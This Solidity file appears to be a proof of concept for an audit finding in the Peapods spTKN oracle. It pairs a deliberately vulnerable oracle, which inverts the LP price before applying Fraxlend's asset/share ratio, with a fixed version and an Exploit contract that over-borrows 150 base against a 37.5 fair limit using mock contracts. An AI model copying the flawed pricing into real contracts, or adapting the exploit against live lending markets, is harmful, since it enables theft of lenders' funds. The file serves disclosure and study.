// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Peapods spTKNMinimalOracle — Sherlock 2025-01, H-5
    _calculateSpTknPerBase inverts the LP price and only then calls
    Fraxlend convertToAssets. The asset/share ratio is applied on the wrong
    side. 100 spTKN prices at 200 base instead of 50, and the attacker
    borrows 150 base against a 37.5 fair maximum.
*/

contract BaseToken {
    string public symbol = "BASE";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Pair {
    function getReserves() external pure returns (uint112, uint112) {
        return (uint112(1e18), uint112(1e18));
    }

    function totalSupply() external pure returns (uint256) {
        return 2e18;
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }
}

contract FraxlendPair {
    function convertToAssets(uint256 shares) external pure returns (uint256) {
        return shares * 2;
    }
}

contract SpOracle {
    Pair public pair;
    FraxlendPair public frax;
    bool public constant BASE_IS_POD = false;
    bool public constant BASE_IS_FRAX_PAIR = true;
    uint256 public lastPrice;

    constructor(Pair pair_, FraxlendPair frax_) {
        pair = pair_;
        frax = frax_;
    }

    function _sqrt(uint256 x) internal pure returns (uint256 y) {
        if (x == 0) return 0;
        uint256 z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }

    function _calculateSpTknPerBase(uint256 _price18) public returns (uint256 _spTknBasePrice18) {
        uint256 _priceBasePerPTkn18 = _price18;
        (uint112 _reserve0, uint112 _reserve1) = pair.getReserves();
        uint256 _k = uint256(_reserve0) * uint256(_reserve1);
        uint256 _kDec = 10 ** 18 * 10 ** 18;
        uint256 _avgBaseAssetInLp18 = _sqrt((_priceBasePerPTkn18 * _k) / _kDec) * 10 ** (18 / 2);
        uint256 _basePerSpTkn18 = (2 * _avgBaseAssetInLp18 * 10 ** pair.decimals()) / pair.totalSupply();
        require(_basePerSpTkn18 > 0, "V2R");
        _spTknBasePrice18 = 10 ** (18 * 2) / _basePerSpTkn18;
        if (BASE_IS_POD) {
            _spTknBasePrice18 = _spTknBasePrice18;
        } else if (BASE_IS_FRAX_PAIR) {
            // @> VULN: convertToAssets is applied after the inversion, so the share ratio scales spTKN per base instead of the LP fair price
            _spTknBasePrice18 = frax.convertToAssets(_spTknBasePrice18);
        }
        lastPrice = _spTknBasePrice18;
    }
}

contract SpOracleFixed {
    Pair public pair;
    FraxlendPair public frax;

    constructor(Pair pair_, FraxlendPair frax_) {
        pair = pair_;
        frax = frax_;
    }

    function _sqrt(uint256 x) internal pure returns (uint256 y) {
        uint256 z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }

    function _calculateSpTknPerBase(uint256 _price18) public view returns (uint256 _spTknBasePrice18) {
        (uint112 _reserve0, uint112 _reserve1) = pair.getReserves();
        uint256 _k = uint256(_reserve0) * uint256(_reserve1);
        uint256 _kDec = 10 ** 18 * 10 ** 18;
        uint256 cbr = frax.convertToAssets(1e18);
        uint256 _avgBaseAssetInLp18 = _sqrt((_price18 * _k) / _kDec) * 10 ** (18 / 2);
        uint256 _basePerSpTkn18 = (2 * _avgBaseAssetInLp18 * 10 ** 18) / pair.totalSupply();
        // Multiply the asset/share ratio first, then invert. The vulnerable path does the opposite.
        _basePerSpTkn18 = _basePerSpTkn18 * cbr / 1e18;
        _spTknBasePrice18 = 10 ** (18 * 2) / _basePerSpTkn18;
    }
}

contract Lender {
    BaseToken public base;
    SpOracle public oracle;
    uint256 public constant LTV = 75;

    constructor(BaseToken base_, SpOracle oracle_) {
        base = base_;
        oracle = oracle_;
    }

    function borrow(uint256 collateral) external returns (uint256 amount) {
        uint256 price = oracle._calculateSpTknPerBase(1e18);
        uint256 value = collateral * price / 1e18;
        amount = value * LTV / 100;
        require(base.transfer(msg.sender, amount), "borrow");
    }
}

contract Exploit {
    BaseToken public base;
    Pair public pair;
    FraxlendPair public frax;
    SpOracle public oracle;
    Lender public lender;
    uint256 public price;
    uint256 public borrowed;
    uint256 public fairMax;

    constructor() {
        base = new BaseToken();
        pair = new Pair();
        frax = new FraxlendPair();
        oracle = new SpOracle(pair, frax);
        lender = new Lender(base, oracle);
        base.mint(address(lender), 150 ether);
    }

    function run() external {
        borrowed = lender.borrow(100 ether);
        price = oracle.lastPrice();
        fairMax = 37.5 ether;
        require(price == 2 ether, "price");
        require(borrowed == 150 ether, "borrowed");
        require(borrowed > fairMax, "over");
        require(base.balanceOf(address(this)) == 150 ether, "balance");
    }
}
